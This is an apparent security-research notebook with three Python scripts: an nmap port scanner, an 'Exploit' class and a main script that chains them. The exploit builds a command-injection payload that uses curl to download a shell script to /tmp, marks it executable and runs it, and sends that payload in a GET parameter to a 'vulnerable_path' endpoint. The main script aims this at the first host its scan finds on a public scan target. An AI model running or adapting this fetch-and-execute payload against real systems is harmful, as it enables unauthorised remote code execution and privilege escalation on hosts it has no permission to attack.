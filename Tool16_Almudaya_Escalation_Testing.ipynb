{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNA2CKfeTdFtGJ/rD17qpLh",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elangbijak4/Security_Research/blob/main/Tool16_Almudaya_Escalation_Testing.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#instal dulu nmap !apt dan !pip"
      ],
      "metadata": {
        "id": "nbwIsNFIXr9J"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "scanner.py"
      ],
      "metadata": {
        "id": "OCHu2rLtRdBk"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import nmap\n",
        "\n",
        "class NetworkScanner:\n",
        "    def __init__(self):\n",
        "        self.nm = nmap.PortScanner()\n",
        "\n",
        "    def scan(self, target):\n",
        "        self.nm.scan(target, '80,443')\n",
        "        return self.nm.all_hosts()\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    scanner = NetworkScanner()\n",
        "    target = 'scanme.nmap.org'\n",
        "    hosts = scanner.scan(target)\n",
        "    print(f\"Hosts found: {hosts}\")"
      ],
      "metadata": {
        "id": "AH1POqj2Tuff"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "exploit.py"
      ],
      "metadata": {
        "id": "fb4jmyZ2T3GA"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "\n",
        "class Exploit:\n",
        "    def __init__(self, target, port):\n",
        "        self.target = target\n",
        "        self.port = port\n",
        "\n",
        "    def create_payload(self):\n",
        "        # Payload Privilege Escalation\n",
        "        payload = \"curl -o /tmp/escalate.sh http://{}/escalate.sh && chmod +x /tmp/escalate.sh && /tmp/escalate.sh\".format(self.target)\n",
        "        return payload\n",
        "\n",
        "    def send_payload(self, payload):\n",
        "        try:\n",
        "            url = f\"http://{self.target}:{self.port}/vulnerable_path\"\n",
        "            params = {\"input\": payload}\n",
        "            response = requests.get(url, params=params)\n",
        "            print(\"Payload sent successfully\")\n",
        "            print(\"Response:\")\n",
        "            print(response.text)\n",
        "        except Exception as e:\n",
        "            print(f\"Failed to send payload: {e}\")\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    target = '127.0.0.1'\n",
        "    port = 80  # Example port for HTTP\n",
        "    exploit = Exploit(target, port)\n",
        "    payload = exploit.create_payload()\n",
        "    exploit.send_payload(payload)"
      ],
      "metadata": {
        "id": "SRC1q20GT1tR"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "main.py"
      ],
      "metadata": {
        "id": "v90bvTtBUCKp"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from scanner import NetworkScanner\n",
        "from exploit import Exploit\n",
        "\n",
        "def main():\n",
        "    # Step 1: Scan network\n",
        "    scanner = NetworkScanner()\n",
        "    target = 'scanme.nmap.org'\n",
        "    hosts = scanner.scan(target)\n",
        "    print(f\"Hosts found: {hosts}\")\n",
        "\n",
        "    if hosts:\n",
        "        # Step 2: Exploit target\n",
        "        target_host = hosts[0]\n",
        "        target_port = 80  # Example port for HTTP\n",
        "        exploit = Exploit(target_host, target_port)\n",
        "        payload = exploit.create_payload()\n",
        "        exploit.send_payload(payload)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "id": "SQpEQJfqUBK4"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}